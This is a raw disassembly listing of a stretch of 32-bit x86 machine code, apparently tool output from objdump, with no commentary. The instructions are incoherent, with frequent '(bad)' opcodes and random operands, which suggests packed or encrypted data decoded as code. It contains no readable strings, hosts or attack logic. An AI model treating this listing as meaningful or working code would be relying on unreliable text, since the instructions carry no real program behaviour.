  419cda:	test   eax,0x8433d3a7
  419cdf:	jae    0x419d3c
  419ce1:	(bad)  
  419ce2:	pop    esi
  419ce3:	mov    edx,0x1fb30525
  419ce8:	div    DWORD PTR [ecx-0x80]
  419ceb:	inc    ebx
  419cec:	inc    esp
  419ced:	sbb    BYTE PTR [ebp-0x20],ah
  419cf0:	add    cl,BYTE PTR ds:0xa2504c7e
  419cf6:	inc    edi
  419cf7:	push   es
  419cf8:	shl    DWORD PTR [esi-0x5a],0xed
  419cfc:	adc    bl,dl
  419cfe:	pop    edi
  419cff:	cmp    al,0x9c
  419d01:	mov    esi,0x54713d01
  419d06:	pop    ebx
  419d07:	loop   0x419ca4
  419d09:	mov    edx,DWORD PTR [ecx+0x8ecbf80]
  419d0f:	inc    ebp
  419d10:	or     ecx,DWORD PTR [ebx-0x34]
  419d13:	dec    ebp
  419d14:	stos   DWORD PTR es:[edi],eax
  419d15:	sub    esp,esp
  419d17:	mov    al,ds:0x8bbdadb9
  419d1c:	xor    esp,edi
  419d1e:	jmp    0x419d67
  419d20:	pop    esi
  419d21:	sbb    BYTE PTR [eax-0x2429dbd6],cl
  419d27:	cmp    DWORD PTR [edx-0x2f3c97a6],edx
  419d2d:	add    eax,0x5422a468
  419d32:	add    eax,0x4f5c956c
  419d37:	stos   DWORD PTR es:[edi],eax
  419d38:	aam    0x30
  419d3a:	and    bh,al
  419d3c:	test   DWORD PTR [edx],ebx
  419d3e:	xchg   edi,eax
  419d3f:	mul    BYTE PTR [esi-0x6883c386]
  419d45:	stc    
  419d46:	mov    al,0x62
  419d48:	int3   
  419d49:	push   ebx
  419d4a:	sub    BYTE PTR [edi],al
  419d4c:	mov    ah,0x64
  419d4e:	jle    0x419dcc
  419d50:	scas   eax,DWORD PTR es:[edi]
  419d51:	xor    dh,BYTE PTR [ecx-0x54865c76]
  419d57:	(bad)  
  419d58:	sub    esp,DWORD PTR [esi]
  419d5a:	(bad)  
  419d5b:	leave  
  419d5c:	inc    edx
  419d5d:	js     0x419db1
  419d5f:	adc    BYTE PTR [edx-0x2b],cl
  419d62:	inc    BYTE PTR [ebp+0x10]
  419d65:	shr    DWORD PTR [ebx-0x25],0x9
  419d69:	xchg   esp,eax
  419d6a:	push   edi
  419d6b:	inc    ecx
  419d6c:	xchg   edx,eax
  419d6d:	or     eax,0xdb9837a
  419d72:	es and al,0xb3
  419d75:	(bad)  
  419d77:	ds xchg ebx,eax
  419d79:	mov    ds:0x93049d48,al
  419d7e:	xchg   ecx,eax
  419d80:	cmp    BYTE PTR [edi],ch
  419d82:	xor    bh,BYTE PTR [esi]
  419d84:	pop    edi
  419d86:	jae    0x419de5
  419d88:	stos   DWORD PTR es:[edi],eax
  419d89:	add    DWORD PTR ds:[edx-0x1978e1a],esi
  419d90:	xor    ch,ah
  419d92:	pop    ebx
  419d93:	inc    eax
  419d94:	mov    cl,BYTE PTR [esi-0x68]
  419d97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419d98:	lds    edx,FWORD PTR [eax+0x2c]
  419d9b:	push   0xcf6c5e00
  419da0:	pop    esi
  419da1:	popa   
  419da2:	sub    DWORD PTR [edi-0x5669bb8d],0xe
  419da9:	not    DWORD PTR [ebx+eax*8]
  419dac:	ds sti 
  419dae:	xor    BYTE PTR [ebp+0x1d],al
  419db1:	sbb    eax,0xc022e2ef
  419db6:	mov    al,ds:0xad5f080d
  419dbc:	xor    al,0x2
  419dbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dbf:	ins    DWORD PTR es:[edi],dx
  419dc0:	fild   DWORD PTR [ebp+0x5c]
  419dc3:	mov    al,ds:0x94ee87ac
  419dc8:	rcr    DWORD PTR [eax],1
  419dca:	aam    0xd
  419dcc:	fs xor bl,ah
  419dcf:	cmp    DWORD PTR [ebx+edi*8],0xffffff8f
  419dd3:	test   DWORD PTR [ecx-0x56b185cb],edi
  419dd9:	add    dl,BYTE PTR [edi]
  419ddb:	adc    esp,eax
  419ddd:	jae    0x419e5b
  419ddf:	(bad)  
  419de0:	cli    
  419de1:	or     esi,DWORD PTR [edi-0x4f6a6b51]
  419de7:	lea    eax,[ebx]
  419de9:	sbb    al,0x0
  419deb:	lahf   
  419dec:	(bad)  
  419ded:	call   0xe123:0x5e3c7abb
  419df4:	cmp    ebx,edi
  419df6:	dec    eax
  419df7:	loop   0x419e73
  419df9:	sub    ebx,DWORD PTR [ebp-0x45]
  419dfc:	loop   0x419e78
  419dfe:	rcr    BYTE PTR [ebx],cl
  419e00:	xchg   edi,eax
  419e01:	sub    ebx,DWORD PTR [eax]
  419e03:	mov    bh,0xa
  419e05:	dec    ebp
  419e06:	add    ebp,edi
  419e08:	cli    
  419e09:	jecxz  0x419e43
  419e0b:	sub    eax,0x69bcf41f
  419e10:	or     al,0xa9
  419e12:	dec    ecx
  419e13:	repz test eax,0xfa1fe82b
  419e19:	int    0xc
  419e1b:	or     BYTE PTR [esi+0x52],ch
  419e1e:	xor    al,0x63
  419e20:	sbb    DWORD PTR [edi+eax*8-0x7a],eax
  419e24:	bound  edi,QWORD PTR [edi]
  419e26:	daa    
  419e27:	jl     0x419ea8
  419e29:	mov    ah,0x10
  419e2b:	jno    0x419dd6
  419e2d:	xchg   ebx,eax
  419e2e:	shl    BYTE PTR [esi],cl
  419e30:	dec    ebp
  419e31:	bound  edx,QWORD PTR [edi]
  419e33:	cmp    eax,DWORD PTR [ebp+edx*4-0x89dc49d]
  419e3a:	repz cmp al,0xfc
  419e3d:	push   cs
  419e3e:	hlt    
  419e3f:	enter  0x252,0xb3
  419e43:	ins    DWORD PTR es:[edi],dx
  419e44:	cli    
  419e45:	mov    dh,0x5d
  419e47:	mov    ebx,edx
  419e49:	mov    ah,0x66
  419e4b:	mov    esp,DWORD PTR [ebp+0x38]
  419e4e:	loopne 0x419dd9
  419e50:	(bad)  
  419e51:	cmp    esi,ecx
  419e53:	adc    DWORD PTR [ebx+0x6cf43263],edx
  419e59:	outs   dx,BYTE PTR ds:[esi]
  419e5a:	iret   
  419e5b:	pop    ebp
  419e5c:	ins    BYTE PTR es:[edi],dx
  419e5d:	push   esp
  419e5e:	in     al,0x23
  419e60:	mov    eax,DWORD PTR [ecx-0x31067995]
  419e66:	xchg   BYTE PTR [esi+ebp*2-0x304357c9],dl
  419e6d:	pop    ds
  419e6e:	test   DWORD PTR [edx-0x1a0b8da],0x31405c1d
  419e78:	(bad)  
  419e79:	in     eax,0x15
  419e7b:	gs push ss
  419e7d:	sbb    al,0x3e
  419e7f:	push   ebp
  419e80:	imul   ebp,ebp,0x64b6b1ce
  419e86:	adc    DWORD PTR [edx-0x2a2480f3],0xf3dbcde1
  419e90:	enter  0xd46b,0xea
  419e94:	add    ch,dl
  419e96:	pop    edx
  419e97:	push   es
  419e98:	xchg   edx,eax
  419e99:	retf   0x95e1
  419e9c:	(bad)  
  419e9d:	neg    BYTE PTR [ebx+0x31]
  419ea0:	xchg   BYTE PTR [edx-0x16d799f2],dl
  419ea6:	xchg   BYTE PTR [esi-0x50],ch
  419ea9:	shl    BYTE PTR [ebp-0x35],0xda
  419ead:	and    DWORD PTR [edx-0x7c],ecx
  419eb0:	lods   al,BYTE PTR ds:[esi]
  419eb1:	inc    edx
  419eb2:	fisubr WORD PTR [edi+0x32dddcf6]
  419eb8:	mov    edx,0xef004478
  419ebd:	add    DWORD PTR ds:0x62d1a8fe,ebp
  419ec3:	ror    BYTE PTR [ebp-0x38],0x36
  419ec7:	mov    ds:0xb07523ea,al
  419ecc:	adc    DWORD PTR [edi-0x7e],ebp
  419ecf:	sar    DWORD PTR [esi+ebx*1+0x7d],1
  419ed3:	or     BYTE PTR [edx],dh
  419ed5:	jne    0x419f2c
  419ed7:	out    dx,eax
  419ed8:	xor    edx,DWORD PTR fs:[eax+0x3b7ee6f3]
  419edf:	in     eax,dx
  419ee0:	pop    esi
  419ee1:	aaa    
  419ee2:	cmp    DWORD PTR [ecx],esp
  419ee4:	xor    ebp,DWORD PTR [eax+0x53]
  419ee7:	in     al,0xe8
  419ee9:	pop    ecx
  419eea:	adc    al,0xcb
  419eec:	cs cs mov edi,0xdce604c4
  419ef3:	bound  eax,QWORD PTR [ecx-0x5e]
  419ef6:	inc    ebp
  419ef7:	icebp  
  419ef8:	jne    0x419f0a
  419efa:	(bad)  
  419efb:	in     al,0x8
  419efd:	ja     0x419eb8
  419eff:	mov    al,0x54
  419f01:	and    DWORD PTR [edi+eax*8+0x33],ecx
  419f05:	(bad)  
  419f06:	popa   
  419f07:	mov    al,0x22
  419f09:	mov    cs,esi
  419f0b:	sub    DWORD PTR [esi-0x5a],0x18
  419f0f:	int    0x91
  419f11:	push   ebp
  419f12:	lods   al,BYTE PTR ds:[esi]
  419f13:	mov    ecx,0x75094936
  419f18:	(bad)  
  419f19:	mov    DWORD PTR [edi],ebp
  419f1b:	xchg   edx,eax
  419f1c:	adc    eax,0xf1cda683
  419f21:	ret    
  419f22:	clc    
  419f23:	(bad)  
  419f25:	out    0x79,al
  419f27:	dec    esp
  419f28:	pop    edx
  419f29:	daa    
  419f2a:	(bad)  
  419f2b:	sti    
  419f2c:	retf   
  419f2d:	cmp    DWORD PTR [ebx+0x44],edi
  419f30:	nop
  419f31:	xor    eax,0x489567b2
  419f36:	retf   0x51a2
  419f39:	mov    bl,0xcb
  419f3b:	cmp    DWORD PTR [esi+0x67],0xfc21d983
  419f42:	push   cs
  419f43:	push   ecx
  419f44:	jp     0x419f2f
  419f46:	jp     0x419f64
  419f48:	or     eax,0x9735c489
  419f4d:	xor    dh,BYTE PTR [esp+ebp*2]
  419f50:	out    0x70,al
  419f52:	out    0x24,al
  419f54:	mov    bl,0xb7
  419f56:	push   eax
  419f57:	mov    esi,0xb0a42585
  419f5c:	sub    DWORD PTR [edx],0xff97933d
  419f62:	sar    BYTE PTR [esi+0xefbf9e6],1
  419f68:	mov    ah,0x14
  419f6a:	stos   BYTE PTR es:[edi],al
  419f6b:	sbb    ebx,ecx
  419f6d:	push   eax
  419f6e:	pusha  
  419f6f:	lahf   
  419f70:	mov    bl,0x68
  419f72:	ds cwde 
  419f74:	add    DWORD PTR [esp+esi*4+0x10],0x35c6db6b
  419f7c:	rcr    DWORD PTR [ebx+0x6a9453eb],cl
  419f82:	out    0x7a,al
  419f84:	not    BYTE PTR [esi+ebx*1]
  419f87:	mov    ebp,0x462bb60
  419f8c:	and    eax,0xc5baeb46
  419f91:	jl     0x419fe1
  419f93:	loop   0x419fe3
  419f95:	in     eax,dx
  419f96:	test   dh,dh
  419f98:	and    al,BYTE PTR [esi+0x3d]
  419f9b:	fild   QWORD PTR [edi]
  419f9d:	adc    DWORD PTR [esp+eax*2],ebx
  419fa0:	outs   dx,BYTE PTR gs:[esi]
  419fa2:	and    DWORD PTR ds:0x53c3814c,edx
  419fa8:	in     eax,dx
  419fa9:	mov    ebx,0x2a0a1dda
  419fae:	mov    ah,0x7f
  419fb0:	loop   0x419fec
  419fb2:	mov    ?,WORD PTR [eax]
  419fb4:	jnp    0x419f37
  419fb6:	pusha  
  419fb7:	dec    ecx
  419fb8:	sbb    al,0x2b
  419fba:	ret    
  419fbb:	nop
  419fbc:	mov    ecx,0xb2692f28
  419fc1:	pop    esi
  419fc2:	pop    edx
  419fc3:	pusha  
  419fc4:	mov    dl,0x18
  419fc6:	int3   
  419fc7:	mov    bl,0xfe
  419fc9:	scas   eax,DWORD PTR es:[edi]
  419fca:	repnz fldenv [eax]
  419fcd:	add    bl,BYTE PTR [ebx+0x28]
  419fd0:	addr16 iret 
  419fd2:	sbb    al,0xbb
  419fd4:	popa   
  419fd5:	das    
  419fd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fd7:	in     al,dx
  419fd8:	lds    edi,FWORD PTR [edx+0x25]
  419fdb:	or     DWORD PTR [edx+eax*8],0x2c
  419fdf:	add    BYTE PTR [edx+0x68125871],dh
  419fe5:	mov    esi,0x7eb320c
  419fea:	stc    
  419feb:	out    0x44,eax
  419fed:	mov    eax,ds:0x10ffc892
  419ff2:	aam    0x37
  419ff4:	lock inc edi
  419ff6:	arpl   di,di
  419ff8:	push   edi
  419ff9:	out    0xe3,eax
  419ffb:	xor    DWORD PTR [edi],ebp
  419ffd:	xchg   ecx,eax
  419ffe:	stos   DWORD PTR es:[edi],eax
  419fff:	push   cs
  41a000:	loope  0x41a080
  41a002:	(bad)  
  41a003:	sub    ecx,DWORD PTR [edi+eiz*2]
  41a006:	push   edx
  41a007:	mov    esi,0x49936b63
  41a00c:	mov    bh,0xa8
  41a00e:	sbb    DWORD PTR [ebp+0x5a],ecx
  41a011:	xor    eax,0x6f72885
  41a016:	cmp    DWORD PTR [ebx-0x557101d0],0x35cd67ec
  41a020:	and    DWORD PTR [ebx+0xb],ebp
  41a023:	sbb    eax,0x3800d017
  41a028:	jnp    0x41a06c
  41a02a:	popf   
  41a02b:	xchg   ebx,eax
  41a02c:	imul   ebx,DWORD PTR ds:0x2d55d03e,0x83429d06
  41a036:	call   0x7b2118e5
  41a03b:	add    ebp,DWORD PTR [edx+0xd6f9cb4]
  41a041:	inc    ebx
  41a042:	popf   
  41a043:	mov    bl,0x51
  41a045:	and    al,0x47
  41a047:	ja     0x41a014
  41a049:	dec    edx
  41a04a:	jo     0x41a09b
  41a04c:	fs (bad) 
  41a04e:	call   0xe6abdfc6
  41a053:	ins    BYTE PTR es:[edi],dx
  41a054:	pusha  
  41a055:	xor    ah,BYTE PTR [esi-0x3ced8f33]
  41a05b:	lahf   
  41a05c:	neg    edx
  41a05e:	pop    es
  41a05f:	(bad)  
  41a060:	shl    DWORD PTR [esi-0x41],1
  41a063:	or     esi,ebx
  41a065:	push   es
  41a066:	stos   BYTE PTR es:[edi],al
  41a067:	add    bh,cl
  41a069:	push   cs
  41a06a:	push   0x7a72013f
  41a06f:	shl    ecx,cl
  41a071:	in     al,dx
  41a072:	popa   
  41a073:	add    ecx,esi
  41a075:	xor    BYTE PTR [eax],cl
  41a077:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a078:	mov    ch,0x1c
  41a07a:	imul   eax,DWORD PTR [eax],0x51
  41a07d:	je     0x41a033
  41a07f:	sbb    esi,edi
  41a081:	add    dh,dh
  41a083:	cmp    ah,BYTE PTR gs:[ecx-0x6b]
  41a087:	push   esp
  41a088:	nop
  41a089:	add    al,0xed
  41a08b:	stc    
  41a08c:	fcomip st,st(5)
  41a08e:	push   edi
  41a08f:	sar    al,0xf9
  41a092:	jo     0x41a100
  41a094:	pop    edi
  41a095:	(bad)  
  41a096:	dec    ebx
  41a097:	sahf   
  41a098:	scas   al,BYTE PTR es:[edi]
  41a099:	in     al,dx
  41a09a:	mov    al,ah
  41a09c:	fs scas eax,DWORD PTR es:[edi]
  41a09e:	hlt    
  41a09f:	sbb    eax,0x1451eaf3
  41a0a4:	mov    ah,0x42
  41a0a6:	addr16 test eax,0xd1779d74
  41a0ac:	or     al,0xca
  41a0ae:	push   ebx
  41a0af:	imul   ebp,DWORD PTR [edi-0x14fa509],0x18684c0b
  41a0b9:	std    
  41a0ba:	(bad)  
  41a0bc:	and    edi,ebp
  41a0be:	fwait
  41a0bf:	stos   DWORD PTR es:[edi],eax
  41a0c0:	mov    eax,ds:0x3492437
  41a0c5:	inc    esp
  41a0c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0c7:	xchg   ebp,eax
  41a0c8:	mov    edx,DWORD PTR [edx]
  41a0ca:	sti    
  41a0cb:	push   ss
  41a0cc:	(bad)
  41a0d0:	(bad)  [ecx-0x4]
  41a0d3:	jnp    0x41a07a
  41a0d5:	popa   
  41a0d6:	mov    eax,ds:0xd0e08eef
  41a0db:	inc    edi
  41a0dc:	mov    DWORD PTR [ebx],ebp
  41a0de:	(bad)  
  41a0df:	imul   ebp,DWORD PTR [esi],0xffffff95
  41a0e2:	mov    ch,0x3a
  41a0e4:	pop    esp
  41a0e5:	pop    ebx
  41a0e6:	aam    0x60
  41a0e8:	dec    esi
  41a0e9:	sbb    DWORD PTR [eax+0x64],eax
  41a0ec:	dec    edx
  41a0ed:	mov    dl,0xd6
  41a0ef:	iretw  
  41a0f1:	aad    0xb4
  41a0f3:	mov    ah,0x38
  41a0f5:	sub    DWORD PTR [edi-0x6f],edi
  41a0f8:	cmp    ebx,DWORD PTR [edi-0x42]
  41a0fb:	and    ecx,eax
  41a0fd:	sub    edx,DWORD PTR [edi+ebp*2-0x4a]
  41a101:	jmp    0x7af3:0x6852a23a
  41a108:	(bad)  
  41a109:	enter  0x4b9d,0x2e
  41a10d:	into   
  41a10e:	pop    esp
  41a10f:	mov    edi,0xab77c94c
  41a114:	sub    eax,ecx
  41a116:	xchg   ebp,eax
  41a117:	push   ss
  41a118:	cdq    
  41a119:	mov    eax,ds:0x5fc1984
  41a11e:	adc    al,0x22
  41a120:	inc    esp
  41a121:	xlat   BYTE PTR ds:[ebx]
  41a122:	push   edx
  41a123:	(bad)  
  41a124:	lock pop edi
  41a126:	in     al,dx
  41a127:	xchg   ebp,eax
  41a128:	sub    DWORD PTR [edx+0x139d117],edi
  41a12e:	jg     0x41a0be
  41a130:	(bad)  
  41a131:	mov    ebx,0x79ba02b
  41a136:	cmp    dl,BYTE PTR [edx-0xc]
  41a139:	fdivr  DWORD PTR [esi+0x29d6d8f3]
  41a13f:	xlat   BYTE PTR ds:[ebx]
  41a140:	pop    edi
  41a141:	push   eax
  41a142:	(bad)  
  41a143:	nop
  41a144:	or     al,ah
  41a146:	push   0xffffff89
  41a148:	jno    0x41a135
  41a14a:	push   edi
  41a14b:	push   es
  41a14c:	dec    edi
  41a14d:	mov    al,ds:0x6e8ecb6e
  41a152:	(bad)  
  41a153:	ds mov ecx,0x177a2a85
  41a159:	jg     0x41a16f
  41a15b:	cmc    
  41a15c:	in     eax,0xcd
  41a15e:	hlt    
  41a15f:	cs dec esi
  41a161:	and    BYTE PTR [eax],cl
  41a163:	inc    esi
  41a164:	gs lahf 
  41a166:	and    al,0xbe
  41a168:	add    al,bl
  41a16a:	or     bh,BYTE PTR [esi-0x60]
  41a16d:	loopne 0x41a107
  41a16f:	or     al,0x33
  41a171:	in     eax,0x92
  41a173:	pop    edi
  41a174:	add    eax,0xef91461b
  41a179:	test   al,0xd6
  41a17b:	aad    0xd0
  41a17d:	xor    dh,bh
  41a17f:	push   ebp
  41a180:	mov    fs,WORD PTR [edx+0x57]
  41a183:	push   esp
  41a184:	in     al,0xa1
  41a186:	sub    DWORD PTR [ebp+0x23855caf],edi
  41a18c:	cmove  edx,esi
  41a18f:	pop    eax
  41a190:	mov    ah,0x50
  41a192:	mov    bh,0xc7
  41a194:	(bad)  
  41a195:	mov    ebx,0x7c1069d5
  41a19a:	pusha  
  41a19b:	es stc 
  41a19d:	cli    
  41a19e:	mov    dl,0x3b
  41a1a0:	out    dx,al
  41a1a1:	lea    edi,cs:[edx+ebp*2+0x16aae7e8]
  41a1a9:	iret   
  41a1aa:	enter  0xc17c,0xe3
  41a1ae:	add    cl,BYTE PTR [eax-0x1984359c]
  41a1b4:	mov    DWORD PTR [edx-0x340e1492],0xc0b42cd7
  41a1be:	push   ebp
  41a1bf:	(bad)  
  41a1c1:	ins    BYTE PTR es:[edi],dx
  41a1c2:	or     al,0x71
  41a1c4:	adc    eax,0x2fd3c071
  41a1c9:	int    0x39
  41a1cb:	sar    BYTE PTR [edx+eiz*8-0x6991c920],1
  41a1d2:	inc    edi
  41a1d3:	test   eax,0x24f597e
  41a1d8:	sahf   
  41a1d9:	dec    esp
  41a1da:	or     ah,0xf5
  41a1dd:	push   ss
  41a1de:	xor    edx,eax
  41a1e0:	push   ecx
  41a1e1:	lea    eax,[edx+0x794cba5b]
  41a1e7:	ret    
  41a1e8:	push   ebp
  41a1e9:	call   0x6770ac1a
  41a1ee:	imul   DWORD PTR [ebx+ebx*8]
  41a1f1:	xor    ah,bl
  41a1f3:	inc    edi
  41a1f4:	out    0x91,al
  41a1f6:	add    al,0xe6
  41a1f8:	sub    ah,BYTE PTR [ecx-0x4cb97cd4]
  41a1fe:	mov    ch,0xbc
  41a200:	aas    
  41a201:	daa    
  41a202:	add    DWORD PTR [esp+ecx*8-0x196aee9c],edi
  41a209:	pop    DWORD PTR [eax-0x44]
  41a20c:	add    eax,DWORD PTR [ebp-0x404d717]
  41a212:	aaa    
  41a213:	mov    ah,0x95
  41a215:	rcl    DWORD PTR [esi+0x7f],1
  41a218:	std    
  41a219:	rcr    edx,0x2f
  41a21c:	inc    edi
  41a21d:	mov    edx,0x111dd27b
  41a222:	add    BYTE PTR [edi+0x0],0x0
	...
  41a3ee:	add    BYTE PTR [eax],al
  41a3f0:	xchg   edi,edx
  41a3f2:	dec    ebp
  41a3f3:	jnp    0x41a452
  41a3f5:	sti    
  41a3f6:	mov    bh,0xff
  41a3f8:	ds aad 0x54
  41a3fb:	ret    0x89a6
  41a3fe:	fdiv   st(4),st
  41a400:	cmc    
  41a401:	call   0x0:0x7220001
  41a408:	stc    
  41a409:	loopne 0x41a3a3
  41a40b:	add    al,0xe6
  41a40d:	jp     0x41a3a4
  41a40f:	or     edx,DWORD PTR ds:0xf302f7f3
  41a415:	scas   al,BYTE PTR es:[edi]
  41a416:	adc    al,0x46
  41a418:	add    eax,0x1d9d8df0
  41a41d:	jns    0x41a477
  41a41f:	inc    eax
  41a420:	out    dx,al
  41a421:	(bad)  
  41a422:	inc    edi
  41a423:	push   0xffffff90
  41a425:	dec    esi
  41a426:	push   ds
  41a427:	pop    ebx
  41a428:	ret    
  41a429:	popf   
  41a42a:	push   0xffffffc9
  41a42c:	jmp    0x41a3d9
  41a42e:	pushf  
  41a42f:	lea    ecx,[ebx-0x1d]
  41a432:	sub    DWORD PTR [esi+0x6b],eax
  41a435:	ret    0xd506
  41a438:	rcr    BYTE PTR [ebx-0x5df55a7a],0x95
  41a43f:	inc    edi
  41a440:	cli    
  41a441:	inc    ecx
  41a442:	jnp    0x41a48d
  41a444:	and    esp,DWORD PTR [ecx-0x3e5569a2]
  41a44a:	jmp    0x4a94:0x4ae89e08
  41a451:	xchg   esp,esp
  41a453:	xlat   BYTE PTR ds:[ebx]
  41a454:	mov    esp,0x8126177e
  41a459:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a45a:	in     eax,dx
  41a45b:	mov    edi,0x9541f4e5
  41a460:	pop    ecx
  41a461:	data16 sbb dl,bl
  41a464:	dec    esp
  41a465:	loope  0x41a494
  41a467:	es xchg edi,eax
  41a469:	lods   eax,DWORD PTR ds:[esi]
  41a46a:	push   esi
  41a46b:	mov    dl,0xb1
  41a46d:	jg     0x41a4e6
  41a46f:	rol    DWORD PTR [ebx+0x47],cl
  41a472:	add    cl,bl
  41a474:	ret    
  41a475:	xchg   ecx,eax
  41a476:	mov    esi,0xbbb9f57e
  41a47b:	cdq    
  41a47c:	adc    cl,bl
  41a47e:	mov    bl,0x86
  41a480:	adc    al,0x67
  41a482:	hlt    
  41a483:	mov    al,0xca
  41a485:	mov    WORD PTR [ebp+0x47],?
  41a488:	pop    ebp
  41a489:	xor    bh,dl
  41a48b:	xor    ebp,esi
  41a48d:	ficomp DWORD PTR [eax+0x5271a842]
  41a493:	test   eax,0x4086ea4c
  41a498:	adc    ecx,DWORD PTR [ebp+0x1]
  41a49b:	cmp    cl,BYTE PTR [edx-0x43]
  41a49e:	mov    al,ds:0x5cf84e8e
  41a4a3:	sbb    esp,esi
  41a4a5:	and    BYTE PTR [ebp-0x5d],dh
  41a4a8:	pop    edi
  41a4a9:	sti    
  41a4aa:	pop    es
  41a4ab:	xor    BYTE PTR [edx],0xce
  41a4ae:	adc    ebp,DWORD PTR [esi-0x60c6ab28]
  41a4b4:	mov    esp,0xa86f3119
  41a4b9:	(bad)  
  41a4ba:	dec    esi
  41a4bb:	fcmovbe st,st(7)
  41a4bd:	mov    ds:0x17ca0488,eax
  41a4c2:	jge    0x41a4f5
  41a4c4:	int    0xf3
  41a4c6:	xchg   DWORD PTR [esi+0x9],ebx
  41a4c9:	loope  0x41a520
  41a4cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4cc:	out    dx,eax
  41a4cd:	neg    BYTE PTR [eax+0x30ccf5a8]
  41a4d3:	xor    eax,0xb86cf429
  41a4d8:	retf   
  41a4d9:	jl     0x41a521
  41a4db:	das    
  41a4dc:	rcr    DWORD PTR [ebx-0x40],1
  41a4df:	jl     0x41a4c7
  41a4e1:	setae  cl
  41a4e4:	cmp    BYTE PTR [ecx-0x30],bh
  41a4e7:	xchg   ebx,eax
  41a4e8:	xor    bh,al
  41a4ea:	cwde   
  41a4eb:	sbb    al,0x53
  41a4ed:	jno    0x41a4d6
  41a4ef:	mov    edi,0x25e87202
  41a4f4:	retf   
  41a4f5:	or     edx,DWORD PTR [ebp*8-0x4e09ff73]
  41a4fc:	mov    eax,0xdb2ab29e
  41a501:	jno    0x41a560
  41a503:	pop    ebx
  41a504:	jle    0x41a501
  41a506:	sbb    esi,DWORD PTR [eax-0x34]
  41a509:	leave  
  41a50a:	sub    eax,0x8e4e48b5
  41a50f:	mov    dh,0xf7
  41a511:	mov    dl,0x42
  41a513:	call   0x2179a7da
  41a518:	add    al,BYTE PTR [ebx]
  41a51a:	sar    DWORD PTR [ecx-0x5e2f3ca],0x4d
  41a521:	popf   
  41a522:	es cmp cl,dh
  41a525:	scas   al,BYTE PTR es:[edi]
  41a526:	lahf   
  41a527:	data16 (bad) 
  41a529:	xsha1  
  41a52c:	sbb    esi,DWORD PTR [edx-0x29932038]
  41a532:	out    dx,eax
  41a533:	addr16 dec ebp
  41a535:	in     al,dx
  41a536:	mov    cs,WORD PTR [edi-0x6de9ee8a]
  41a53c:	in     al,0x1a
  41a53e:	les    edi,FWORD PTR [edx+eiz*8-0x6c]
  41a542:	or     eax,DWORD PTR [ebx+ebx*2+0x44]
  41a546:	mov    eax,cs:0xa6e8c52a
  41a54c:	ss pop esi
  41a54e:	mov    ecx,ebx
  41a550:	cli    
  41a551:	mov    al,ds:0xed0b79e7
  41a556:	cs add ecx,esi
  41a559:	sub    al,0x46
  41a55b:	inc    ecx
  41a55c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a55d:	add    ch,BYTE PTR [eax]
  41a55f:	rcr    bh,1
  41a561:	add    dl,ah
  41a563:	retf   0x576f
  41a566:	int    0x7a
  41a568:	cwde   
  41a569:	retf   0xdce7
  41a56c:	clc    
  41a56d:	aad    0x2b
  41a56f:	(bad)  
  41a570:	jmp    0xfe866391
  41a575:	inc    ebx
  41a576:	add    eax,0x7028fcdd
  41a57b:	xchg   BYTE PTR [ebp+0x5afbc0cc],ch
  41a581:	pusha  
  41a582:	scas   eax,DWORD PTR es:[edi]
  41a583:	int3   
  41a584:	sbb    DWORD PTR [esi+ebx*1+0x39],ebp
  41a588:	jg     0x41a5ab
  41a58a:	add    DWORD PTR [eax],esi
  41a58c:	aam    0xaf
  41a58e:	and    BYTE PTR [edx-0x27],ah
  41a591:	imul   ecx,DWORD PTR [edx+0x65d3dcd],0x71f48e5
  41a59b:	lock int3 
  41a59d:	push   0xc58811c3
  41a5a2:	jecxz  0x41a595
  41a5a4:	inc    eax
  41a5a5:	gs dec edi
  41a5a7:	fidivr DWORD PTR [eax-0x20]
  41a5aa:	shl    DWORD PTR [ebx-0x1a],1
  41a5ad:	test   DWORD PTR [edx],esi
  41a5af:	sbb    BYTE PTR [ebx-0x1c],cl
  41a5b2:	stos   DWORD PTR es:[edi],eax
  41a5b3:	mov    bl,0xc0
  41a5b5:	or     bh,ch
  41a5b7:	les    eax,FWORD PTR [edi-0x57]
  41a5ba:	cmc    
  41a5bb:	sub    eax,0xe2ca401a
  41a5c0:	inc    edi
  41a5c1:	mov    al,ds:0xb8db8732
  41a5c6:	rol    BYTE PTR [esi],1
  41a5c8:	arpl   ax,ax
  41a5ca:	and    BYTE PTR [ecx],ah
  41a5cc:	aaa    
  41a5cd:	inc    eax
  41a5ce:	add    DWORD PTR [edx],esp
  41a5d0:	cmp    DWORD PTR [ebp+0x26],esi
  41a5d3:	cmp    BYTE PTR [ecx],0xfc
  41a5d6:	fimul  WORD PTR [ebx-0xf]
  41a5d9:	mov    ecx,0xc1240e74
  41a5de:	js     0x41a5df
  41a5e0:	push   esp
  41a5e1:	lock (bad) 
  41a5e3:	jle    0x41a601
  41a5e5:	repz popa 
  41a5e7:	not    DWORD PTR [edx-0x5c]
  41a5ea:	out    dx,al
  41a5eb:	mov    eax,0x1aa93a05
  41a5f0:	ret    0x6de6
  41a5f3:	mov    eax,0x85cb3fc2
  41a5f8:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5fa:	jp     0x41a67a
  41a5fc:	movq   QWORD PTR [eax+eax*4+0x260502c9],mm7
  41a604:	sbb    dl,BYTE PTR [edx+ebx*2]
  41a607:	add    DWORD PTR [bx+di],ecx
  41a60a:	lods   eax,DWORD PTR ds:[esi]
  41a60b:	mov    edi,0xf31e0377
  41a610:	and    ebp,DWORD PTR [eax-0x2cdaa8c4]
  41a616:	pushf  
  41a617:	sbb    eax,DWORD PTR [eax-0x77]
  41a61a:	lahf   
  41a61b:	and    ah,dl
  41a61d:	inc    edi
  41a61e:	mov    cl,0x5b
  41a620:	jg     0x41a5a9
  41a622:	cmp    BYTE PTR [edx-0x27caae6b],al
  41a628:	inc    edx
  41a629:	jecxz  0x41a5e7
  41a62b:	add    BYTE PTR [esi+0x29],0x4f
  41a62f:	sti    
  41a630:	xlat   BYTE PTR ds:[ebx]
  41a631:	or     DWORD PTR [ecx-0x79b53b3f],esp
  41a637:	jg     0x41a691
  41a639:	idiv   BYTE PTR [esi-0x248e3c30]
